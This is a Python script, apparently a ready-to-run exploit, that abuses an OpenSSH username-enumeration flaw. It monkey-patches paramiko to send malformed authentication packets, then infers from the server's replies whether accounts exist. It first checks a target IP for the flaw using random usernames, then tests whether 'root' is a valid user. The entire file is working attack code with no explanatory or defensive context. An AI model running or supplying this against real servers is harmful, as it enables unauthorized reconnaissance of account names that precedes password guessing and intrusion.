try:
    import logging
    import paramiko
    import os
    import socket
    import string
    import sys
    import json
    from random import randint as rand
    from random import choice as choice
    logging.basicConfig(level=logging.CRITICAL,format="%(message)s")
except Exception as e:
    os._exit(6)

old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

random_username_list = []

for i in range(3):
    user = "".join(choice(string.ascii_lowercase) for x in range(rand(15, 20)))
    random_username_list.append(user)

class BadUsername(Exception):
    def __init__(self):
        pass


def add_boolean(*args, **kwargs):
    pass


def call_error(*args, **kwargs):
    raise BadUsername()


def malform_packet(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean
    result  = old_parse_service_accept(*args, **kwargs)
    paramiko.message.Message.add_boolean = old_add_boolean
    return result

def checkUsername(ip,port,username, tried=0):
    sock = socket.socket()
    sock.connect((ip,port))
    
    transport = paramiko.transport.Transport(sock)
    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        transport.close()
        if tried < 4:
            tried += 1
            return checkUsername(ip,port,username, tried)
        else:
            logging.critical('[-] Failed to negotiate SSH transport')
    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
    except BadUsername:
            return (username, False)
    except paramiko.ssh_exception.AuthenticationException:
            return (username, True)
    raise Exception("There was an error. Is this the correct version of OpenSSH?")

def checkVulnerable(ip,port):
    try:
        vulnerable = True
        for user in random_username_list:
            result = checkUsername(ip,port,user)
            if result[1]:
                vulnerable = False
        return vulnerable
    except Exception as e:
        logging.critical("[*] time out")
        os._exit(4)
        
def exportJSON(results):
    data = {"Valid":[], "Invalid":[]}
    for result in results:
        if result[1] and result[0] not in data['Valid']:
            data['Valid'].append(result[0])
        elif not result[1] and result[0] not in data['Invalid']:
            data['Invalid'].append(result[0])
    return json.dumps(data)

def exportCSV(results):
    final = "Username, Valid\n"
    for result in results:
        final += result[0]+", "+str(result[1])+"\n"
    return final

def exportList(results):
    final = ""
    for result in results:
        if result[1]:
            final+=result[0]+" is a valid user!\n"
        else:
            final+=result[0]+" is not a valid user!\n"
    return final

paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error

logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())


def main(ip,port,username):
    sock = socket.socket()
    sock.settimeout(3)
    try:
        sock.connect((ip, 22))
        sock.close()
    except socket.error as e:
        logging.critical('[*] timeout')
        sys.exit(4)
        
    if not checkVulnerable(ip,port):
        
        logging.critical("[-] do not found openssh enumery")
        sys.exit(4)
    elif username: #single username passed in
        result = checkUsername(ip,port,username)
        if result[1]:
            logging.critical("[+] "+ip+" have a valid user:root")
            sys.exit(1)
        else:
            logging.critical("[-] "+ip+" do not have a valid user!")
            sys.exit(2)

    else: # no usernames passed in
        logging.critical("[-] "+ip+" do not have a valid user!")
        sys.exit(2)

if __name__ == '__main__':
    import sys
    ip = sys.argv[1]
    port = sys.argv[2]
    main(ip,int(port),'root')
